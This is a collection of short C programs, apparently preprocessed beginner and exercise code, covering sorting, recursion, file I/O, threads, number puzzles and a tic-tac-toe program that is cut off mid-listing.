    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n char nome[30] = \"Elias Castro\";\n int idade = 25;\n float altura = 1.77;\n FILE *f;\n f = fopen(\"arquivo.txt\", \"w\");\n if (f == ((void*)0)){\n printf(\"Erro na abertura!\\n\");\n system(\"pause\");\n exit(1);\n }\n printf(\"Nome %s, Idade %d, Altura %0.2f\", nome, idade, altura);\n fprintf(f, \"\\n\\nNome %s, Idade %d, Altura %0.2f\",nome,idade,altura );\n fclose(f);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint triangularSum(int* nums, int numsSize)\n{\n    if (numsSize == 1)\n        return nums[0];\n    int a[1000];\n    for (int i = 0; i < numsSize - 1; i++) {\n        a[i] = (nums[i] + nums[i+1]) % 10;\n    }\n    for (int i = 0; i < numsSize - 1; i++)\n        nums[i] = a[i];\n    return triangularSum(a, numsSize - 1);\n}\nint main()\n{\n    int a[5] = {1, 2, 3, 4, 5};\n    printf(\"%d\", triangularSum(a, 5));\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n    int arr0[] = {1, 3, 5};\n    int arr1[] = {0, 1, 2, 3, 4, 5};\n    printf(\"arr0 length == %zu\\n\", (sizeof(arr0) / sizeof((arr0)[0])));\n    printf(\"arr1 length == %zu\\n\", (sizeof(arr1) / sizeof((arr1)[0])));\n    return 0;\n}",
    "int main(void)\n{\nint a=2;\n if (-a)\n return 0;\n }",
    "int main() {\n    return '\\075';\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\n\nint plotwideTofreq(char data_array[1001][3][256],char *freq_data[1001][2],int count_file_num);\nint fileout(char *data_out[1001][2]);\nint main(void) {\n FILE *fp;\n char file_name[] = \"../data/sweep_saf_w_edit.txt\";\n  char single_data[1001][3][256];\n  char str[256],str1[256],str2[256],str3[256];\n  int data_number,count_file=0;\n  char *freq_data[1001][2];\n fp = fopen(file_name, \"r\");\n if(fp == ((void*)0)) {\n  printf(\"%s file not open!\\n\", file_name);\n  return -1;\n } else {\n  printf(\"%s file opened!\\n\", file_name);\n }\n  int datacount = 0;\n   while (fscanf(fp, \"\\t%s\\t%s\\t%s\", str1, str2, str3) !=(-1)){\n     data_number = datacount%1001;\n     if ( data_number == 1000){\n       strcpy(single_data[data_number][0],str1);\n       strcpy(single_data[data_number][1],str2);\n       strcpy(single_data[data_number][2],str3);\n       plotwideTofreq(single_data,freq_data,count_file);\n       count_file += 1;\n     } else {\n       strcpy(single_data[data_number][0],str1);\n       strcpy(single_data[data_number][1],str2);\n       strcpy(single_data[data_number][2],str3);\n     }\n      datacount += 1;\n   }\n  printf(\"count_file:%d\\n\", count_file);\n  fclose(fp);\n return 0;\n}\nint plotwideTofreq(char plot_data[1001][3][256],char *data_out[1001][2], int count_file_num){\n  int i,temp_min_data;\n  char *endptr;\n  float temp_min_f[1001][3];\n  int max_f = 55;\n  float freq_val,temp_min_int,temp_f;\n  temp_min_int = 2;\n  for (i = 0; i < 1001; i++) {\n    freq_val = strtof(plot_data[i][2], &endptr);\n    temp_f = strtof(plot_data[i][1],&endptr);\n    if ((temp_min_int > freq_val ) && (max_f >= temp_f)) {\n        temp_min_int = freq_val;\n        temp_min_data = i;\n        printf(\"temp_min_data:%d\\n\",temp_min_data );\n        printf(\"freq_val:%f\\n\",freq_val );\n        printf(\"temp_min_int:%f\\n\",temp_min_int );\n    }\n  }\n  printf(\"data_out[count_file_num][0] :%s\\n\",data_out[count_file_num][0] );\n  printf(\"data_out[count_file_num][1] :%s\\n\",data_out[count_file_num][1] );\n  printf(\"plot_data[temp_min_data][0] :%s\\n\",plot_data[temp_min_data][0] );\n  printf(\"plot_data[temp_min_data][1] :%s\\n\",plot_data[temp_min_data][1] );\n  strcpy(data_out[count_file_num][0],plot_data[temp_min_data][0]);\n  strcpy(data_out[count_file_num][1],plot_data[temp_min_data][1]);\n  printf(\"data_out[count_file_num][0]:%s\\n\",data_out[count_file_num][0] );\n  return 0;\n}\nint fileout(char *data_out[1001][2]){\n  FILE *fpw;\n  char new_filename[256];\n  int datacount;\n  sprintf(new_filename,\"../data/plotFreqData/sweep.csv\");\n  fpw = fopen(new_filename,\"w\");\n    if (fpw == ((void*)0)) {\n      printf(\"%s File can't open.\\n\",new_filename);\n    } else {\n      for (datacount = 0; datacount <= 1001; datacount++) {\n        fprintf(fpw, \"\\t%s\\t%s\\n\", data_out[datacount][0],data_out[datacount][1]);\n      }\n    }\n  fclose(fpw);\n  return 0;\n}",
    "#include <stdio.h>\nvoid combinationUtil(int arr[], int data[], int start, int end, int index, int r);\nvoid printCombination(int arr[], int n, int r);\nvoid allCombinations(int arr[], int n, int r);\nvoid allCombinations(int arr[], int n, int r)\n{\n for (int i = 0; i <= r; i++)\n {\n  printCombination(arr, n, r-i);\n }\n}\nvoid printCombination(int arr[], int n, int r)\n{\n int data[r];\n combinationUtil(arr, data, 0, n-1, 0, r);\n}\nvoid combinationUtil(int arr[], int data[], int start, int end,\n     int index, int r)\n{\n if (index == r)\n {\n  for (int j=0; j<r; j++)\n   printf(\"%d \", data[j]);\n  printf(\"\\n\");\n  return;\n }\n for (int i=start; i<=end && end-i+1 >= r-index; i++)\n {\n  data[index] = arr[i];\n  combinationUtil(arr, data, i+1, end, index+1, r);\n }\n}\nint main()\n{\n int arr[] = {1, 2, 3, 4, 5};\n int n = sizeof(arr)/sizeof(arr[0]);\n allCombinations(arr, n, n);\n}",
    "#include <stdio.h>\nint main() {\n    int n, i, resto;\n    scanf(\"%d\", &n);\n    for(i=1; i<10000;i++){\n        if(i%n==2){\n            printf(\"%d\\n\", i);\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main (void){\n    int x = 17;\n    int y = 4;\n    float div;\n    printf(\"the value of x is %d\\n\", x);\n    printf(\"the value of y is %d\\n\", y);\n    printf(\"the sum of x and y is %d\\n\", x + y);\n    printf(\"the product of x and y is %d\\n\", x * y);\n    printf(\"the difference of x and y is %d\\n\", x - y);\n    div = (float) x / y;\n    printf(\"the division of x and y is %f\\n\", div);\n    printf(\"the remainder of x and y is %d\\n\", x % y);\n    return 0;}",
    "#include <stdio.h>\nvoid swap(int *a, int *b)\n{\n    int aux = *a;\n    *a = *b;\n    *b = aux;\n}\nvoid print_array(int arr[], int n)\n{\n    for (int k = 0; k - n; k++)\n        printf(\"%d \", arr[k]);\n    printf(\"\\n\");\n}\nvoid bubble_sort(int *arr, int sz_arr)\n{\n    for (int j = 0; j < sz_arr - 1; j++)\n    {\n        for(int i = 0; i < sz_arr - 1 - j; i++)\n        {\n            if(*(arr+i) > *(arr + i + 1))\n                swap(arr + i, arr + i + 1);\n            printf(\"%d \", i);\n            if(sz_arr - 1 - j == 1)\n                return;\n        }\n        printf(\"\\nj = %d\\n\", j);\n    }\n}\nint main()\n{\n    int arr[] = {4, 9, 2, 1, 7, 8};\n    int n = sizeof(arr)/ sizeof(int);\n    printf(\"Array before: \\n\");\n    print_array(arr, n);\n    printf(\"Bubble sort the hell out of them: \\n\");\n    bubble_sort(arr, n);\n    printf(\"Array after: \\n\");\n    print_array(arr, n);\n}",
    "#include <pthread.h>\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <errno.h>\n#include <ctype.h>\n#include <string.h>\n\npthread_mutex_t mut;\nint water = 0;\nvoid* sailorRemovesWater(void * arg_s){\n int index = 0;\n  while(index < 20)\n  {\n   while(pthread_mutex_trylock(&mut) != 0);\n   if(water <= 0){\n    printf(\"The ship is dry, captain!\\n\");\n   }else{\n    water -= 50;\n    printf(\"Sailor %ld removed 50 liters from the ship\\n\", ((long)arg_s) + 1);\n   }\n   pthread_mutex_unlock(&mut);\n   index++;\n  }\n pthread_exit(((void*)0));\n}\nvoid* pirateDoes(void * arg_p){\n  int inx = 0;\n  while(inx < 20)\n  {\n    while(pthread_mutex_trylock(&mut) != 0);\n    water += 50;\n    printf(\"Pirate %ld spilled 50 liters on the ship\\n\", ((long)arg_p) +1);\n    pthread_mutex_unlock(&mut);\n    inx++;\n  }\n  pthread_exit(((void*)0));\n}\nint main(int argc, char** argv)\n{\n long sailor = 1;\n long pirate = 1;\n if(argc >= 2){\n  pirate = atoi(argv[1]);\n  sailor = atoi(argv[2]);\n }\n pthread_t thread_p[pirate];\n pthread_t thread_s[sailor];\n pthread_mutex_init(&mut, ((void*)0));\n for (long t = 0; t < pirate; ++t)\n {\n  pthread_create(&thread_p[t],((void*)0),&pirateDoes,(void*) t);\n }\n for (long t = 0; t < sailor; ++t)\n {\n  pthread_create(&thread_s[t],((void*)0),&sailorRemovesWater,(void*) t);\n }\n for (long t = 0; t < pirate; ++t)\n {\n  pthread_join(thread_p[t],((void*)0));\n }\n for (long t = 0; t < sailor; ++t)\n {\n  pthread_join(thread_s[t],((void*)0));\n }\n printf(\"Water: %d\\n\", water);\n pthread_mutex_destroy(&mut);\n return 0;\n}",
    "#include <stdio.h>\n#include <fcntl.h>\nint main()\n{\n    int fd = open(\"alphabet.txt\",(0x04000000));\n    FILE *fs1 = fdopen(fd,\"r\");\n    char buff1[20];\n    setvbuf(fs1,buff1,0,20);\n    FILE *fs2 = fdopen(fd,\"r\");\n    char buff2[20];\n    setvbuf(fs2,buff2,0,20);\n    int flag1 = 1, flag2 = 2;\n    while(flag1 == 1 || flag2 == 1)\n    {\n        char c;\n        flag1 = fscanf(fs1,\"%c\",&c);\n        if (flag1 == 1)\n         fprintf((stdout),\"%c\",c);\n        flag2 = fscanf(fs2,\"%c\",&c);\n        if (flag2 == 1)\n         fprintf((stdout),\"%c\",c);\n    }\n    return 0;\n}",
    "#include <pthread.h>\n#include <unistd.h>\n#include <stdio.h>\nstatic void *second(void *ignored){\n    while (1){\n        sleep(5);\n        printf(\"\\nSecond thread slept 5 seconds.\\n\");\n    }\n    return ((void*)0);\n}\nint main(int argc, char *argv[]){\n    pthread_t second_thread;\n    int code;\n    code = pthread_create(&second_thread, ((void*)0), second, ((void*)0));\n    if(code){\n        fprintf((stderr), \"pthread_create failed with code %d\\n\", code);\n    }\n    int key = 0;\n    printf(\"Press some keys: \");\n    while (key != 10) {\n        key = fgetc((stdin));\n    }\n    pthread_cancel(second_thread);\n    printf(\"Second thread has been canceled.\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\n\nint getchars(char s[], int max);\ndouble atof(char s[]);\nint main(void)\n{\n    char s[1000];\n    printf(\"Input a floating-point number, then press enter:\\n\");\n    while (getchars(s, 1000) == 0)\n        ;\n    printf(\"The number is: %lf\\n\", atof(s));\n    return 0;\n}\nint getchars(char s[], int max)\n{\n    int c, i, l;\n    for (i = 0, l = 0; (c = getchar()) != (-1) && c != '\\n'; ++i)\n        if (i < max - 1)\n            s[l++] = c;\n    s[l] = '\\0';\n    return l;\n}\ndouble atof(char s[])\n{\n    double val, power, base, epower;\n    int i, sign, exponent;\n    for (i = 0; __isspace(s[i]); i++)\n        ;\n    sign = (s[i] == '-') ? -1 : 1;\n    if (s[i] == '+' || s[i] == '-')\n        i++;\n    for (val = 0.0; (0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10); i++)\n        val = 10.0 * val + (s[i] - '0');\n    if (s[i] == '.')\n        i++;\n    for (power = 1.0; (0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10); i++) {\n        val = 10.0 * val + (s[i] - '0');\n        power *= 10;\n    }\n    epower = 1;\n    if (s[i] == 'e' || s[i] == 'E') {\n        i++;\n        base = s[i] == '-' ? 0.1 : 10.0;\n        if (s[i] == '-' || s[i] == '+')\n            i++;\n        for (exponent = 0; (0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10); i++) {\n            exponent = 10 * exponent + (s[i] - '0');\n        }\n        while (exponent-- > 0)\n            epower *= base;\n    }\n    return sign * val / power * epower;\n}",
    "int printf(char *, ...);\nint main(int argc, char *argv[]) {\n  printf(\"hello world\");\n  return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int i, j;\n    for (i = 1; i < 5 ; i++) {\n  for (j = 0; j < i ; j++) {\n   printf(\"%d \", j);\n  }\n  printf(\"%d\", i);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int i, j, a , b, temp, x = 0;\n    for(i = 0;i < 100; i++){\n        scanf(\"%d %d\", &a, &b);\n        if(a <= 0 || b <= 0){\n            break;\n        }\n        if(a > b){\n            temp = a;\n            a = b;\n            b = temp;\n        }\n        for(j = a; j <= b; j++){\n            printf(\"%d \", j);\n            x = x + j;\n        }\n        printf(\"Sum=%d\\n\", x);\n        x = 0;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int sub1,sub2,total;\n float avg;\n sub1 = 88;\n sub2 = 92;\n total = sub1 + sub2;\n avg = total / 2.0;\n printf(\"Average marks of two subjects : %.2f\\n\", avg);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int no1;\n  int no2;\n  float average;\n  printf(\"Enter the first mark:\");\n  scanf(\"%d\",&no1);\n  printf(\"Enter second mark:\");\n  scanf(\"%d\",&no2);\n  average = (no1 + no2)/2;\n  printf(\"Average is:%.2f\\n\",average);\n  return 0;\n}",
    "#include <stdio.h>\nvoid sort(int n, int a[n]){\n    int i, j, min, idx, temp;\n    for(i=0; i<n; i++){\n        min=a[i];\n        idx=i;\n        for(j=i+1; j<n; j++){\n            if(a[j]<min){\n                min=a[j];\n                idx=j;\n            }\n        }\n        temp=a[i];\n        a[i]=a[idx];\n        a[idx]=temp;\n    }\n}\nint main(){\n    int n, i, count;\n    scanf(\"%d\", &n);\n    int a[n];\n    for(i=0; i<n; i++){\n        scanf(\"%d\", &a[i]);\n    }\n    sort(n, a);\n    count=n;\n    for(i=0; i<n-1; i++){\n        if(a[i]==a[i+1])\n            count--;\n    }\n    printf(\"%d\\n\", count);\n    return 0;\n}",
    "#include <stdio.h>\nint zhishu(int a)\n{\n  int i,n=0;\n  for(i=2;i<=a;i++)\n    if(a%i==0)\n      n++;\n  if(n==1)\n    return 1;\n  else\n    return 0;\n}\nint main()\n{\n  int n,m,d;\n  scanf(\"%d\",&n);\n  m=n+1;\n  while(1)\n  {\n   d=zhishu(m);\n   if(d==1)\n   {\n     printf(\"%d\",m);\n     break;\n }\n m++;\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n_Bool isBadVersion(int version) {\n    return version >= 100000000;\n}\nunsigned int binarySearch(unsigned int first, unsigned int last) {\n    unsigned int mid = first + (last - first) / 2;\n    if (isBadVersion(mid) && !isBadVersion(mid - 1)) return mid;\n    if (!isBadVersion(mid)) return binarySearch(mid + 1, last);\n    return binarySearch(first, mid);\n}\nint firstBadVersion(int n) {\n    return binarySearch(1, (unsigned int)n + 1);\n}\nint main() {\n    int ans = firstBadVersion(2147483647);\n    printf(\"first bad version: %d\\n\", ans);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n char *pArray[4] = {\n  \"hellow\",\n  \"how are you\",\n  \"fine, thanks you. And you?\",\n  \"i'm fine too.\"\n };\n char *(*p)[4] = &pArray;\n int i;\n for(i=0;i<4;i++){\n  printf(\"%s\\n\",(*p)[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nint main(void)\n{\n  printf(\"Herro!\\n\");\n  return(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char **argv){\n    if(argc == 1)\n        printf(\"Hello World!\\n\");\n    else\n        fprintf((stderr), \"What is '%s'?\\n\",\n              argv[1]);\n    return 0;\n}",
    "#include <stdio.h>\nint Binary(int n) {\n if (n == 0)\n  return 0;\n else {\n  return (n % 2 + 10*Binary(n / 2));\n }\n}\nint main() {\n int num;\n printf(\"Enter a Number:\\n\");\n scanf(\"%d\", &num);\n Binary(num);\n printf(\"Binary equivalent of the Number : %d\\n\", Binary(num));\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n {\n int year,month,day,n,l=0,p=0;\n scanf(\"%d %d %d\",&year,&month,&day);\n scanf(\"%d\",&n);\n n+=day-1;\n    day=1;\n do\n {\n if((year%4==0&&year%100!=0)||year%400==0) l=1;\n else l=0;\n    switch(month)\n   {case 1:case 3:case 5:case 7:case 8:case 10:case 12:p=31;break;\n       case 4:case 6:case 9:case 11:p=30;break;\n    case 2:p=28+l;break;\n   }\n if(n>p-1){\n   month++;\n   n-=p;\n }\n    else{\n   day+=n;\n   n=0;\n }\n if(month>=13) {\n   month%=12;\n   year++;\n    }\n    }while(n!=0);\n printf(\"%d.%d.%d\\n\",year,month,day);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid limpar_entrada() {\n    char c;\n    while ((c = getchar()) != '\\n' && c != (-1)) {}\n}\nvoid ler_texto(char *buffer, int length) {\n    fgets(buffer, length, (stdin));\n    strtok(buffer, \"\\n\");\n}\nint main(){\n    int n, nmenores;\n    double alturatotal, alturamedia, percentualMenores;\n    printf(\"Quantas pessoas serao digitadas? \");\n    scanf(\"%d\", &n);\n    char nomes[n][50];\n    int idades[n];\n    double alturas[n];\n    for (int i=0; i<n; i++) {\n  printf(\"Dados da %da pessoa:\\n\", i + 1);\n        printf(\"Nome: \");\n        limpar_entrada();\n        ler_texto(nomes[i], 50);\n        printf(\"Idade: \");\n        scanf(\"%d\", &idades[i]);\n        printf(\"Altura: \");\n        scanf(\"%lf\", &alturas[i]);\n    }\n nmenores = 0;\n alturatotal = 0;\n    for (int i=0; i<n; i++) {\n        if (idades[i] < 16) {\n            nmenores++;\n        }\n        alturatotal = alturatotal + alturas[i];\n    }\n    alturamedia = alturatotal / n;\n    percentualMenores = ((double)nmenores / n) * 100.0;\n printf(\"\\nAltura media = %.2lf\\n\", alturamedia);\n    printf(\"Pessoas com menos de 16 anos: %.1lf%%\\n\", percentualMenores);\n    for(int i=0; i<n; i++) {\n        if (idades[i] < 16) {\n            printf(\"%s\\n\", nomes[i]);\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint hex2int(const char c)\n{\n    if(c >= '0' && c<= '9') {\n        return c - '0';\n    }\n    else if( c >= 'A' && c <= 'F' ) {\n        return c - 'A' + 10;\n    }\n    else if( c >= 'a' && c <= 'f' ) {\n        return c - 'a' + 10;\n    }\n    else {\n        return -1;\n    }\n}\nint main(int argc, char **argv) {\n    if(argc != 3) {\n     printf(\"usuage is: hex2bin hexString binaryFile\");\n     exit(-1);\n    }\n    int b, j=0, hex1, hex2;\n    FILE* outFile = fopen(argv[2],\"w\");\n unsigned int iHexLen=0;\n    while(*(argv[1]+iHexLen) ) iHexLen++;\n    if( iHexLen % 2 != 0 ) {\n        fprintf((stderr), \"invalid hex length\\n\"); exit(1);\n    }\n    for(j=0; j<iHexLen-1; j=j+2) {\n        hex1 = hex2int(argv[1][j]);\n        hex2 = hex2int(argv[1][j+1]);\n        if(hex1 == -1 || hex2 == -1) {\n                fprintf((stderr), \"non-hex input\\n\"); exit(1);\n        }\n        b = (hex1*16) + hex2;\n  if(outFile != ((void*)0))\n         fputc(b, outFile);\n     }\n  if(outFile != ((void*)0))\n      fclose(outFile);\n     exit(0);\n}",
    "#include <stdio.h>\nint main(){\nint i;\nfor (i = 1; i<11; ++i)\n{\nprintf(\"%d\", i);\n}\nreturn 0;\n}",
    "int main() {\n    int a = 1;\n    while (a % 3 != 0) {\n        int b = 1;\n        while (b < 10)\n            b = b*2;\n        a = a + b;\n    }\n    return a;\n}",
    "#include<stdio.h>\nint is_Prime(int x);\nint main()\n{\n int n,i;\n scanf(\"%d\",&n);\n for(i=n+1;i<=1000000;i++){\n  if(is_Prime(i)){\n   printf(\"%d\",i);\n   break;\n  }\n }\n return 0;\n}\nint is_Prime(int x){\n int j;\n if(x==1)return 0;\n else{\n  for(j=2;j*j<=x;j++){\n   if(x%j==0)return 0;\n  }\n }\n return 1;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n char count[256] = { 0 };\n FILE* fp = fopen(\"main.c\", \"r\");\n int len;\n for (len = 0; !feof(fp); ++len)\n {\n  count[fgetc(fp)]++;\n }\n fclose(fp);\n double entropy = 0;\n for (int i = 0; i < 256; i++)\n {\n  if (count[i])\n  {\n   double freq = (double)count[i] / len;\n   entropy -= freq * log(freq) / log(2);\n  }\n }\n printf(\"%lf\\n\", entropy);\n}",
    "#include<stdio.h>\n#include<string.h>\nint main()\n{\n    char s[101];\n    int a[26], id;\n    memset(a, -1, sizeof(a));\n    scanf(\"%s\", s);\n    for (int i = 0; s[i] !='\\0'; i++) {\n        id = s[i] - 'a';\n        if (a[id] == -1) a[id] = i;\n    }\n    for (int i = 0; i < 26; i++) {\n        printf(\"%d \", a[i]);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int rem,result=0,number,count=0,cnt,fact=1;\n    printf(\"Enter any number:\");\n    scanf(\"%d\",&number);\n    int q=number;\n    while(q!=0)\n    {\n        q=q/10;\n        count++;\n    }\n    q=number;\n    cnt=count;\n    while(q!=0)\n    {\n        rem=q%10;\n        while(rem!=1)\n        {\n            fact=fact*rem;\n            rem--;\n        }\n        result=result+fact;\n        q=q/10;\n        cnt=count;\n        fact=1;\n    }\n    printf(\"%d \",result);\n    if(result==number)\n    {\n        printf(\"YES\");\n    }\n    else\n    {\n        printf(\"NO\");\n    }\n}",
    "#include <stdio.h>\nint Cal(int N , int k)\n{\n if(0 == k || 0 == N)\n {\n  return 1;\n }\n if(N < k)\n {\n  return 0;\n }\n if(N == k)\n {\n  return 1;\n }\n return Cal(N-1,k) + Cal(N-1,k-1);\n}\nint main()\n{\n int m,n;\n scanf(\"%d%d\",&m,&n);\n printf(\"%d\\n\",Cal(m,n));\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nint main(void)\n{\n   void f(void);\n   while (1)\n      f();\n   return 0;\n}\nvoid f(void)\n{\n   static int cnt = 0;\n   printf(\"cnt = %d\\n\", ++cnt);\n   if (cnt == 17)\n      exit(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\n\nint aleatorio_entre(int, int);\nint main(){\n  int i;\n  srand(time(((void*)0)));\n  printf(\"O valor de RAND_MAX \u00e9: %d\\n\\n\", (0x7fffffff));\n  printf(\"Gerando 100 aleatorios entre %d e %d: \\n\", -50, 50);\n  for (i = 0; i<= 100;i++){\n    printf(\"%d\\t\", aleatorio_entre(-50, 50));\n  }\n  printf(\"\\n\\n\");\n  getchar();\n}\nint aleatorio_entre(int x, int y){\n  double random, num, R_MAX = (0x7fffffff);\n  int valor;\n  random = rand();\n  num = random / (R_MAX + 1);\n  valor = num * (y - x + 1 );\n  return x + valor;\n}",
    "#include<stdio.h>\nvoid printArray(int arr[], int size) {\n    int i;\n    for(i=0; i<size; i++) {\n        printf(\"%d \", arr[i]);\n    }\n    printf(\"\\n\");\n}\nvoid insertionSort(int arr[], int size) {\n    int i;\n    for(i=1; i<size; i++) {\n        int current = arr[i];\n        int j = i-1;\n        while(j>=0 && arr[j] > current) {\n            arr[j+1] = arr[j];\n            j--;\n        }\n        arr[j+1] = current;\n    }\n}\nint main() {\n    int arr[10] = { 234, 34, 348, 934, 4, 12, 49, 34798, 23, 2 };\n    int size = sizeof(arr)/sizeof(arr[0]);\n    printf(\"initial array :\\n\");\n    printArray(arr, size);\n    insertionSort(arr, size);\n    printf(\"sorted array :\\n\");\n    printArray(arr, size);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int p,n;\n    float r,si;\n    p=1000;\n    n=3;\n    r=8.5;\n    si = p*n*r/100;\n    printf(\"%f \\n\",si);\n    return 0;\n}",
    "#include <stdio.h>\ndouble checkFileSize( const char * fileName ) {\n FILE * file = fopen( fileName, \"rb\" );\n double size = -1;\n if( file == ((void*)0) ) {\n  return -1;\n }\n if( fseek( file, 0, (2) ) ) {\n  fclose( file );\n  return -1;\n }\n size = (ftell(file) / (1024*1024));\n fclose( file );\n return size;\n}\nint main(void) {\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int matriz[4][4];\n    int col, lin, maior = 0, lin_maior, col_maior;\n    for (lin = 0; lin < 4; lin++)\n    {\n        for (col = 0; col < 4; col++)\n        {\n            printf(\"\\nDigite linha e coluna (%d,%d):\", lin, col);\n            scanf(\"%d\", &matriz[lin][col]);\n        }\n    }\n    for (lin = 0; lin < 4; lin++)\n    {\n        for (col = 0; col < 4; col++)\n        {\n            if (matriz[lin][col] == 0)\n            {\n                maior = matriz[lin][col];\n                lin_maior = lin;\n                col_maior = col;\n            }\n            else if (matriz[lin][col] > maior)\n            {\n                maior = matriz[lin][col];\n                lin_maior = lin;\n                col_maior = col;\n            }\n        }\n    }\n    for (lin = 0; lin < 4; lin++)\n    {\n        for (col = 0; col < 4; col++)\n        {\n            printf(\"\\nPosicao (%d,%d):%d\", lin, col, matriz[lin][col]);\n        }\n    }\n    printf(\"\\nPosicao do maior(%d,%d): %d\", lin_maior, col_maior, maior);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n   int a=10;\n   int *p;\n   p=&a;\n   printf(\"p:%x\\n\",p);\n   printf(\"p:%d\\n\",*p);\n   return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\n\nint period[11][2], state[11], init[11], N, T, asleep;\nvoid printState() {\n    printf(\"T%2d (awaken%2d asleep%2d): \", T, N-asleep, asleep);\n    for (int i = 0; i < N; i++)\n        if (state[i] <= period[i][0]) printf(\" %2d  \", state[i]);\n        else printf(\"(%2d) \", state[i]);\n    printf(\"\\n\");\n}\nint simultate() {\n    int loop = 0;\n    int stop = asleep == 0 ? 1 : 0;\n    while (!loop && !stop) {\n        T++; asleep <<= 1;\n        loop = 1; stop = 1;\n        int a = 0;\n        for (int i = 0; i < N; i++) {\n            if (state[i] == period[i][0])\n                state[i] = asleep > N ? state[i] + 1 : 1;\n            else state[i] = state[i] == period[i][1] ? 1 : state[i] + 1;\n            if (state[i] > period[i][0]) { a++; stop = 0; }\n            if (state[i] != init[i]) loop = 0;\n        }\n        asleep = a;\n    }\n    return stop;\n}\nint main() {\n    int kase = 0;\n    while (scanf(\"%d\", &N) == 1 && N) {\n        T = 1; asleep = 0;\n        for (int i = 0; i < N; i++) {\n            scanf(\"%d%d%d\", &period[i][0], &period[i][1], &state[i]);\n            period[i][1] += period[i][0];\n            if (state[i] > period[i][0]) asleep++;\n            init[i] = state[i];\n        }\n        printf(\"Case %d: \", ++kase);\n        if(simultate()) printf(\"%d\\n\", T);\n        else printf(\"-1\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\n\nint fAdd(int);\nint fSub(int);\nvoid fHardCodedMapping(int*);\nint main(int argc, char* argv[])\n{\n  int (*fPointer[])(int) = {fAdd, fSub};\n  int iMapping[20 +1];\n  int iResult;\n  int i;\n  printf(\"*** Vector of function pointer GREAT example ***\\n\");\n  fHardCodedMapping(iMapping);\n  for(i=10; i<=20; i+=10)\n  {\n  iResult = (*fPointer[iMapping[i]])(2);\n  printf(\"Result: %d\\n\", iResult);\n  }\n  return 0;\n}\nint fAdd(int iParam)\n{\n  return 0 + iParam;\n}\nint fSub(int iParam)\n{\n  return 0 - iParam;\n}\nvoid fHardCodedMapping(int* iMap)\n{\n  iMap[10] = 0;\n  iMap[20] = 1;\n}",
    "#include<stdio.h>\nvoid troca(int *a, int *b){\n  int aux;\n  aux = *a;\n  *a = *b;\n  *b = aux;\n}\nint separa(int v[], int left, int right){\n  int pivo = v[right];\n  int j = left, i;\n  for(i = left; i < right; i++){\n    if(v[i] <= pivo){\n      troca(&v[j],&v[i]);\n      j++;\n    }\n  }\n  troca(&v[j], &v[right]);\n  return j;\n}\nvoid Quicksort (int v[], int left, int right){\n   if (left < right){\n      int j = separa (v, left, right);\n      Quicksort (v, left, j-1);\n      Quicksort (v, j+1, right);\n   }\n}\nint main(void) {\n  int vetor[10] = {10,7,3,4,6,1,9,5,8,2};\n  Quicksort(vetor,0,9);\n  int i;\n  for(i=0; i<10; i++){\n    printf(\" %d\",vetor[i]);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint b[3][3];\nint check_winner()\n{\n int i;\n for (i = 0; i < 3; i++) {\n  if (b[i][0] && b[i][1] == b[i][0] && b[i][2] == b[i][0])\n   return b[i][0];\n  if (b[0][i] && b[1][i] == b[0][i] && b[2][i] == b[0][i])\n   return b[0][i];\n }\n if (!b[1][1]) return 0;\n if (b[1][1] == b[0][0] && b[2][2] == b[0][0]) return b[0][0];\n if (b[1][1] == b[2][0] && b[0][2] == b[1][1]) return b[1][1];\n return 0;\n}\nvoid showboard()\n{\n const char *t = \"X O\";\n int i, j;\n for (i = 0; i < 3; i++, putchar('\\n'))\n  for (j = 0; j < 3; j++)\n   printf(\"%c \", t[ b[i][j] + 1 ]);\n printf(\"-----\\n\");\n}\n\nint best_i, best_j;\nint test_move(int val, int depth)\n{\n int i, j, score;\n int best = -1, changed = 0;\n if ((score = check_winner())) return (score == val) ? 1 : -1;\n for (i = 0; i < 3; i++) for (j = 0; j < 3; j++) {\n  if (b[i][j]) continue;\n  changed = b[i][j] = val;\n  score = -test_move(-val, depth + 1);\n  b[i][j] = 0;\n  if (score <= best) continue;\n  if (!depth) {\n   best_i = i;\n   best_j = j;\n  }\n  best = score;\n }\n return changed ? best : 0;\n}\nconst char* game(int user) {\n int i, j, k, move, win = 0;\n for (i = 0; i < 3; i++) for (j = 0; j < 3; j++) b[i][j] = 0;\n printf(\"Board postions are numbered so:\\n1 2 3\\n4 5 6\\n7 8 9\\n\");\n printf(\"You have O, I have X.\\n\\n\");\n for (k = 0; k < 9; k++, user = !user) {\n  while(user) {\n   